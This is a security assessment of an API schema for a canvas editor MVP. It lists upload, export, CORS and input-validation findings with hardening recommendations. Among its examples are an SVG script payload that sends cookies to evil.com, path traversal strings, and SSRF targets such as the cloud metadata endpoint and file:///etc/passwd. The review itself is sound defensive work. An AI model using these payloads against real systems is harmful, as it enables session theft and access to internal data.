# API Schema Security Assessment — Dual Canvas Editor MVP

| Field    | Detail                                             |
| -------- | -------------------------------------------------- |
| Project  | Dual Canvas Editor MVP                             |
| Task     | T-021 — API Schema Security Assessment (ref T-047) |
| Role     | pa-security-architect                              |
| Reviewer | Security Architect                                 |
| Date     | 2026-07-02                                         |
| Artifact | api-schema.md v1.0.0 (pa-data-api-architect)       |
| Status   | **SIGN-OFF WITH CONDITIONS**                       |

---

## Executive Summary

api-schema.md is a well-structured API contract with solid foundations: clean error envelope, idempotent export design, UUID-based asset naming, and explicit rate limiting. However, **4 HIGH-severity findings require resolution before Backend implementation (T-051) can proceed safely.** All are addressable without schema redesign — mostly additions to validation strategy and hardening of existing endpoints.

**Verdict: Conditional Sign-Off** — T-051 can start once the 4 HIGH items are acknowledged and addressed in the implementation plan. The schema itself is sound; the gaps are in missing security controls that must be layered on top.

---

## Findings Summary

| ID    | Area             | Severity  | Summary                                                               |
| ----- | ---------------- | --------- | --------------------------------------------------------------------- |
| AS-01 | Upload           | 🔴 HIGH   | SVG upload allowed without sanitization — stored XSS vector           |
| AS-02 | Upload           | 🔴 HIGH   | MIME-only validation; no content-based (magic byte) verification      |
| AS-03 | Export           | 🔴 HIGH   | No concurrency cap, timeout, or canvas state size limits defined      |
| AS-04 | API Security     | 🔴 HIGH   | CORS policy not specified; `image/svg+xml` in MIME allowlist          |
| AS-05 | Upload           | 🟡 MEDIUM | `category` parameter unvalidated — could enable path traversal        |
| AS-06 | Export           | 🟡 MEDIUM | 24h retention window excessive for user-generated content             |
| AS-07 | Export           | 🟡 MEDIUM | No SSRF controls for server-side image fetching during export         |
| AS-08 | Storage          | 🟡 MEDIUM | Express `static` middleware — directory listing not addressed         |
| AS-09 | Input Validation | 🟡 MEDIUM | No max string length / max layer count / max nesting depth in schemas |
| AS-10 | Input Validation | 🟡 MEDIUM | No request body size limit specified for export endpoint              |
| AS-11 | Error Handling   | 🟢 LOW    | Error envelope well-designed; need explicit "no stack traces in prod" |
| AS-12 | Rate Limiting    | 🟢 LOW    | Per-IP is crude but acceptable for MVP; consider global concurrency   |
| AS-13 | API Versioning   | 🟢 NONE   | Clean design, Sunset header is good practice                          |

---

## Detailed Findings

### AS-01 — SVG Upload: Stored XSS Vector (HIGH)

**Location:** Section 5.1 — Upload Image, allowed MIME types list

```text
Allowed MIME types: image/png, image/jpeg, image/webp, image/svg+xml
```

**Finding:** Allowing `image/svg+xml` uploads means SVG files are accepted, stored under `/storage/uploads/`, and served back to browsers. SVG is executable XML — it can contain `<script>` tags, `<foreignObject>`, `onload` handlers, and `<use>` references to external resources. When a browser loads an SVG directly (or embeds it in an `<img>` tag in some contexts), scripts execute in the origin's security context.

Section 8 (Assumptions) states "SVG uploads allowed; rasterized server-side for export" — this addresses the export path but **does not address the storage/serving path**. An uploaded SVG served from `/storage/uploads/evil.svg` will execute scripts when opened directly.

**Previously flagged in security-review.md (F3):** SVG should be "blocked at content level" but the api-schema now explicitly allows it.

**Recommendation:**

1. **Option A (preferred):** Remove `image/svg+xml` from allowed MIME types. If SVG support is essential for MVP, rasterize SVG to PNG/WebP on upload using Sharp, store only the rasterized version, and discard the original SVG.
2. **Option B:** If raw SVG storage is required, serve SVG files with `Content-Type: image/svg+xml` but add `Content-Disposition: attachment` to force download instead of inline rendering. Add `X-Content-Type-Options: nosniff`.
3. Either way: validate SVG content on upload — reject any SVG containing `<script>`, `<foreignObject>`, `on*` event handlers, or `javascript:` URIs.

**Risk:** An attacker uploads `payload.svg` containing `<script>fetch('https://evil.com/steal?data='+document.cookie)</script>`. Any user opening the URL directly executes the payload in the app's origin.

---

### AS-02 — Content-Based Upload Validation Missing (HIGH)

**Location:** Section 5.1 — Upload Image

**Finding:** Validation is specified as MIME-type allowlist only. The schema does not mandate server-side content inspection (magic byte verification, actual image format detection). An attacker can:

- Upload a PHP webshell with `Content-Type: image/png`
- Upload a polyglot JPEG/HTML file that triggers parser confusion
- Upload an SVG with `Content-Type: image/png` that passes MIME check

**Cross-reference:** security-review.md F1, F2 already flagged this. The api-schema should explicitly reference content-based validation as a backend requirement.

**Recommendation:** Add to Section 5.1 server-side processing notes:

```
Server-side processing (mandatory):
- Validate file magic bytes, not just Content-Type
- Use Sharp metadata() to confirm actual image format
- Reject if actual format ≠ declared MIME type
- Reject SVG content regardless of declared MIME type
- Strip all metadata (EXIF, XMP, ICC profiles) using Sharp
- Generate new filename: UUID + extension matching actual format
```

---

### AS-03 — Export Pipeline: No Resource Protection (HIGH)

**Location:** Section 5.3 — Trigger Export

**Finding:** The export endpoint accepts a full `CanvasState` object with no constraints on:

- **Maximum layer count:** A malicious state with 10,000 layers could consume gigabytes of memory during compositing
- **Maximum dimensions:** No validation that `width` × `height` is within bounds
- **Timeout:** No per-job timeout defined — a complex export could run indefinitely
- **Concurrency:** 503 `EXPORT_QUEUE_FULL` implies a queue exists, but the max queue depth and max concurrent workers are not specified

**Cross-reference:** security-review.md E1, E2 identified same risks against config.ts. The api-schema needs to define these limits explicitly so the backend contract is clear.

**Recommendation:** Add to Section 5.3 validation constraints:

| Constraint            | Value         | Rationale                                      |
| --------------------- | ------------- | ---------------------------------------------- |
| Max layers            | 50 per canvas | Prevents compositing explosion                 |
| Max canvas dimension  | 5000 × 5000   | Beyond this, memory usage is unpredictable     |
| Export timeout        | 60 seconds    | After timeout, job fails with `INTERNAL_ERROR` |
| Max concurrent jobs   | 2 per process | Sharp is single-threaded per instance          |
| Max queue depth       | 20 jobs       | Returns 503 `EXPORT_QUEUE_FULL` when exceeded  |
| Max canvas state JSON | 5 MB          | Reject larger payloads with 413                |

---

### AS-04 — CORS Policy Not Specified (HIGH)

**Location:** Entire document — no CORS specification

**Finding:** The api-schema.md makes no mention of CORS configuration. For an SPA frontend talking to a separate API backend (or even same-origin with different port in development), CORS must be explicitly configured. Without a defined policy:

- Backend may default to permissive CORS (any origin), enabling CSRF
- Frontend development may hit CORS errors with no documented resolution

**Cross-reference:** security-review.md A1 flagged CORS as wide-open.

**Recommendation:** Add a CORS section:

```
CORS Policy (MVP):
- Allowed origins: Configured via CORS_ORIGIN env var
  (default: http://localhost:5173 for Vite dev server)
- Allowed methods: GET, POST (all endpoints are read or create-only)
- Allowed headers: Content-Type, Accept, Accept-Language
- Credentials: false (no auth in MVP, no cookies needed)
- Max age: 86400 (24h preflight cache)

Note: Due to no auth in MVP, CORS alone does not prevent CSRF —
it prevents cross-origin reads but not cross-origin form submissions.
Rate limiting per-IP is the primary CSRF defense for MVP.
```

---

### AS-05 — Unvalidated `category` Parameter (MEDIUM)

**Location:** Section 5.1 — Upload Image, request parameters

**Finding:** The `category` parameter defaults to `"upload"` but there's no server-side enum validation. If `category` is interpolated into the storage path (e.g., `/storage/${category}/${uuid}.webp`), an attacker could inject path traversal sequences like `../../etc` to write files outside the storage directory.

**Recommendation:** Server-side validation: `category` must match exactly one of the four `AssetCategory` values (`upload`, `clipart`, `template`, `garment`). Reject with `400 VALIDATION_ERROR` otherwise. Never interpolate `category` directly into filesystem paths without sanitization.

---

### AS-06 — 24h Export Retention Window (MEDIUM)

**Location:** Section 5.4 — Poll Export Status

> "Export jobs are retained for 24 hours after completion, then purged."

**Finding:** 24 hours is long for user-generated exports. During this window, exported files are accessible via predictable UUID URLs (though UUIDs are unguessable). For a public MVP without auth, any export result is technically accessible to anyone who knows the URL. Reducing the window limits exposure.

**Recommendation:** Reduce retention to 1 hour with a configurable env var. For MVP, exports should be "download and forget" — the client downloads immediately upon completion, so long retention has minimal UX benefit.

---

### AS-07 — SSRF via Export Image Fetching (MEDIUM)

**Location:** Section 4.1 — `ImageLayer.url`, Section 5.3 — export processing

**Finding:** Image layers reference URLs (`asset.url` from the upload endpoint or `ImageLayer.url`). If the export pipeline fetches these URLs server-side during compositing (Sharp composition), an attacker could include URLs pointing to internal services:

- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://localhost:3000/admin/debug`
- `file:///etc/passwd`

**Cross-reference:** security-review.md E4.

**Recommendation:** Add to Section 5.3:

```
URL Safety (server-side image fetching):
- Only fetch URLs matching the configured storage base URL
- Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16)
- Block file://, ftp://, and other non-http/https schemes
- Timeout: 10 seconds per image fetch
- Max redirects: 3
```

---

### AS-08 — Static File Serving: Directory Listing (MEDIUM)

**Location:** Section 6.1 — File Storage Strategy

> "Express `static` middleware on `/storage`"

**Finding:** Express `static` middleware, by default, does not list directories. But this should be explicitly stated as a hard requirement. Additionally, there's no mention of `dotfiles: 'deny'` or explicit index file handling.

**Recommendation:** Document the Express static config explicitly:

```ts
app.use(
  '/storage',
  express.static(storagePath, {
    dotfiles: 'deny',
    index: false, // No directory listing
    redirect: false, // No trailing slash redirects
    maxAge: '1d', // Cache static assets
  }),
);
```

---

### AS-09 — Schema Input Constraints Missing (MEDIUM)

**Location:** Section 4 — Data Schemas

**Finding:** TypeScript interfaces define the shape but not the constraints. Missing:

- **TextLayer.content**: No max length — could store arbitrary data
- **TextLayer.effects**: No max array length
- **CanvasDescriptor.layers**: No max array length
- **Layer.name**: No max length
- **CanvasState nesting depth**: No recursion guard
- **TextEffect.params**: `Record<string, unknown>` — completely untyped, could contain arbitrary nested objects

**Recommendation:** Add a constraints table to Section 4:

| Field                   | Max Length / Count   |
| ----------------------- | -------------------- |
| TextLayer.content       | 10,000 chars         |
| TextLayer.fontFamily    | 100 chars            |
| Layer.name              | 200 chars            |
| CanvasDescriptor.layers | 50 max               |
| TextLayer.effects       | 10 max               |
| ImageLayer.filters      | 10 max               |
| tags[] per asset        | 10 tags, 50 chars ea |

Additionally: replace `Record<string, unknown>` in `TextEffect.params` with a discriminated union of known effect types with validated params.

---

### AS-10 — Export Request Body Size Limit (MEDIUM)

**Location:** Section 5.3 — Trigger Export

**Finding:** The `canvasState` field accepts the full `CanvasState` object but no maximum body size is specified. Express `json()` defaults to 100 KB, which may be too small for legitimate states with many layers — but the limit should be explicit.

**Recommendation:** Define the body size limit: `5 MB` for the export endpoint. This accommodates a maximum-size canvas state (50 layers with full text/image data) while preventing memory exhaustion from oversized payloads.

---

### AS-11 — Error Information Leakage (LOW)

**Location:** Section 2 — Error Response Format

**Finding:** The error envelope is well-designed. The `INTERNAL_ERROR` code for 500 responses is correct. The `details` array for validation errors is appropriate. However, there's no explicit statement that 500 errors must never include raw error messages, stack traces, or internal paths in production.

**Recommendation:** Add to Section 2.1:

```
Production behavior (NODE_ENV=production):
- 500 INTERNAL_ERROR responses: message = "An unexpected error occurred"
  (no stack traces, no file paths, no internal error messages)
- details array: always empty for 500 responses
- Validation error details: safe to include field names and reasons
- Development behavior (NODE_ENV=development): full details may be included
```

---

### AS-12 — Rate Limiting: Global Concurrency (LOW)

**Location:** Section 7 — Rate Limiting

**Finding:** Per-IP rate limits are defined and reasonable for MVP. However, there's no mention of global/concurrent limits — what happens when many different IPs hit the server simultaneously?

**Recommendation:** Acknowledge as a known limitation for MVP. Add:

```
MVP limitation: Per-IP rate limiting does not protect against distributed
attacks (many IPs). For MVP this is acceptable. Production should add:
- Global concurrent request cap (e.g., 100 simultaneous)
- Export concurrency cap (e.g., 2 simultaneous, already in AS-03)
- Cloudflare/load balancer rate limiting as defense-in-depth
```

---

### AS-13 — API Versioning (PASS)

**Location:** Section 1 — API Versioning Strategy

**Finding:** Clean versioning strategy with URL-prefix, 2-release deprecation window, and `Sunset` header. No internal details exposed. No changes needed.

---

## Cross-Reference: api-schema.md vs security-review.md

| api-schema.md decision                    | security-review.md recommendation     | Alignment       |
| ----------------------------------------- | ------------------------------------- | --------------- |
| Allows `image/svg+xml`                    | Explicitly reject SVG content         | **CONFLICT** 🔴 |
| MIME-only upload validation               | Add Sharp content-based validation    | **GAP** 🔴      |
| No concurrency/timeout for export         | Add timeout + concurrency cap         | **GAP** 🔴      |
| No CORS policy stated                     | Restrict CORS origins                 | **GAP** 🔴      |
| UUID-based storage filenames              | UUID-based filenames                  | ✅ Aligned      |
| Rate limiting defined (per-IP)            | Wire rate limiting                    | ✅ Aligned      |
| Error envelope with `INTERNAL_ERROR`      | Custom error handler, no stack traces | ✅ Aligned      |
| Sharp for image processing (no Puppeteer) | Sharp only (smaller attack surface)   | ✅ Aligned      |
| Export idempotency via SHA-256 hash       | Not covered in security review        | ✅ Good design  |
| Canvas state `version` field              | Not covered in security review        | ✅ Good design  |
| Zod validation not specified in schema    | Wire Zod schemas                      | **GAP** 🟡      |

---

## Sign-Off Decision

**Verdict: CONDITIONAL SIGN-OFF**

The api-schema.md provides a solid foundation. The schema design itself (data shapes, endpoint structure, error format, versioning) is **security-conscious and well-thought-out**. The issues are in missing security controls that layer on top of the schema, not in the schema itself.

### Conditions for Full Sign-Off

These 4 items must be **acknowledged and addressed** before or during Backend implementation (T-051):

| #   | Condition                                                                                            | Blocking T-051? |
| --- | ---------------------------------------------------------------------------------------------------- | --------------- |
| 1   | **Remove `image/svg+xml` from allowed MIME types** (or add SVG sanitization/rasterization on upload) | Yes             |
| 2   | **Add content-based (magic byte) upload validation** requirement to schema                           | Yes             |
| 3   | **Define export resource limits** (max layers, timeout, concurrency cap) in schema                   | Yes             |
| 4   | **Specify CORS policy** in schema document                                                           | Yes             |

### Non-Blocking Recommendations (implement during T-051)

| #   | Recommendation                                             |
| --- | ---------------------------------------------------------- |
| 5   | Validate `category` parameter against enum                 |
| 6   | Reduce export retention from 24h to 1h                     |
| 7   | Add SSRF protections for server-side image fetching        |
| 8   | Document Express static config (no directory listing)      |
| 9   | Add input constraints (max lengths, max counts) to schemas |
| 10  | Define request body size limit for export (5 MB)           |
| 11  | Explicit "no stack traces in production" policy            |

---

## Next Steps

1. Data/API Architect reviews and acknowledges the 4 blocking conditions
2. T-051 (Backend) implements the blocking items + non-blocking recommendations
3. Security Architect verifies implementation against this assessment during code review phase
4. api-schema.md should be updated to reflect agreed-upon security constraints

---

_Assessment complete. Ready for Data/API Architect and Backend Engineer consumption._
